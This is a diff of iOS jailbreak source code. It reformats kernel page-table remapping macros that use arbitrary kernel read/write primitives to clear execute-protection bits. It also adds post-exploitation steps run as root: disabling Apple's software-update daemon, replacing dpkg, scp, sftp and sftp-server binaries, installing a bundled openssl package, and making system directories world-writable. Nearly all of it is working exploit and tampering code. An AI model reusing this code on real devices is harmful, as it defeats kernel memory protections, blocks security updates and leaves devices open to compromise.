@@ -469,29 +469,29 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
 #define PMK (PSZ-1)
     
     
-#define RemapPage_(address) \
-pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
-uint64_t tte = ReadAnywhere64(tte_addr);\
-if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
-NSLog(@"breakup!");\
-uint64_t fakep = physalloc(PSZ);\
-uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
-TTE_SETB(tte, TTE_IS_TABLE_MASK);\
-for (int i = 0; i < PSZ/8; i++) {\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
-WriteAnywhere64(fakep+i*8, tte);\
-}\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
-WriteAnywhere64(tte_addr, tte);\
-}\
-uint64_t newt = physalloc(PSZ);\
-copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
-copyout(newt, bbuf, PSZ);\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
-TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
-TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
-WriteAnywhere64(tte_addr, tte);\
-}, level1_table, isvad ? 1 : 2);
+#define RemapPage_(address)\
+    pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
+        uint64_t tte = ReadAnywhere64(tte_addr);\
+        if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
+            NSLog(@"breakup!");\
+            uint64_t fakep = physalloc(PSZ);\
+            uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
+            TTE_SETB(tte, TTE_IS_TABLE_MASK);\
+            for (int i = 0; i < PSZ/8; i++) {\
+                TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
+                WriteAnywhere64(fakep+i*8, tte);\
+            }\
+            TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
+            WriteAnywhere64(tte_addr, tte);\
+        }\
+        uint64_t newt = physalloc(PSZ);\
+        copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
+        copyout(newt, bbuf, PSZ);\
+        TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
+        TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
+        TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
+        WriteAnywhere64(tte_addr, tte);\
+    }, level1_table, isvad ? 1 : 2);
     
 #define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
     
@@ -501,19 +501,19 @@ WriteAnywhere64(tte_addr, tte);\
     
     
 #define RemapPage(x)\
-{\
-int fail = 0;\
-for (int i = 0; i < remapcnt; i++) {\
-if (remappage[i] == (x & (~PMK))) {\
-fail = 1;\
-}\
-}\
-if (fail == 0) {\
-RemapPage_(x);\
-RemapPage_(x+PSZ);\
-remappage[remapcnt++] = (x & (~PMK));\
-}\
-}
+    {\
+        int fail = 0;\
+        for (int i = 0; i < remapcnt; i++) {\
+            if (remappage[i] == (x & (~PMK))) {\
+                fail = 1;\
+            }\
+        }\
+        if (fail == 0) {\
+            RemapPage_(x);\
+            RemapPage_(x+PSZ);\
+            remappage[remapcnt++] = (x & (~PMK));\
+        }\
+    }
     
     level1_table = physp - gPhysBase + gVirtBase;
     WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
@@ -894,6 +894,33 @@ remappage[remapcnt++] = (x & (~PMK));\
                 system("killall -9 cfprefsd");
                 
             }
+            
+            
+            int g = open("/.installed_YaluXPatched", O_RDONLY);
+            
+            if (g == -1) {
+                system("/bin/launchctl unload -w /System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist; mv /System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist /System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist.disabled");
+                
+                NSString* dpkg = [execpath stringByAppendingPathComponent:@"dpkg"];
+                const char* jl = [dpkg UTF8String];
+                
+                unlink("/usr/bin/dpkg");
+                unlink("/tmp/openssl.deb");
+                
+                copyfile(jl, "/usr/bin/dpkg", 0, COPYFILE_ALL);
+                chmod("/usr/bin/dpkg", 0755);
+                
+                NSString* openssl = [execpath stringByAppendingPathComponent:@"openssl.zip"];
+                jl = [openssl UTF8String];
+                
+                copyfile(jl, "/tmp/openssl.deb", 0, COPYFILE_ALL);
+                chmod("/tmp/openssl.deb", 0755);
+                
+                system("/usr/bin/dpkg -i /tmp/openssl.deb");
+                
+                open("/.installed_YaluXPatched", O_RDWR|O_CREAT);
+            }
+            
             {
                 NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
                 char* jl = [jlaunchctl UTF8String];
@@ -902,6 +929,30 @@ remappage[remapcnt++] = (x & (~PMK));\
                 chmod("/usr/libexec/reload", 0755);
                 chown("/usr/libexec/reload", 0, 0);
                 
+            }
+            {
+                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"sftp-server"];
+                char* jl = [jlaunchctl UTF8String];
+                unlink("/usr/libexec/sftp-server");
+                copyfile(jl, "/usr/libexec/sftp-server", 0, COPYFILE_ALL);
+                chmod("/usr/libexec/sftp-server", 0755);
+                chown("/usr/libexec/sftp-server", 0, 0);
+            }
+            {
+                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"scp"];
+                char* jl = [jlaunchctl UTF8String];
+                unlink("/usr/bin/scp");
+                copyfile(jl, "/usr/bin/scp", 0, COPYFILE_ALL);
+                chmod("/usr/bin/scp", 0755);
+                chown("/usr/bin/scp", 0, 0);
+            }
+            {
+                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"sftp"];
+                char* jl = [jlaunchctl UTF8String];
+                unlink("/usr/bin/sftp");
+                copyfile(jl, "/usr/bin/sftp", 0, COPYFILE_ALL);
+                chmod("/usr/bin/sftp", 0755);
+                chown("/usr/bin/sftp", 0, 0);
             }
             {
                 NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
@@ -919,8 +970,6 @@ remappage[remapcnt++] = (x & (~PMK));\
                 chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
                 chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
             }
-            unlink("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
-            
         }
     }
     chmod("/private", 0777);
@@ -928,7 +977,6 @@ remappage[remapcnt++] = (x & (~PMK));\
     chmod("/private/var/mobile", 0777);
     chmod("/private/var/mobile/Library", 0777);
     chmod("/private/var/mobile/Library/Preferences", 0777);
-    system("rm -rf /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; touch /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chmod 000 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chown 0:0 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
     system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
     WriteAnywhere64(bsd_task+0x100, orig_cred);
     sleep(2);
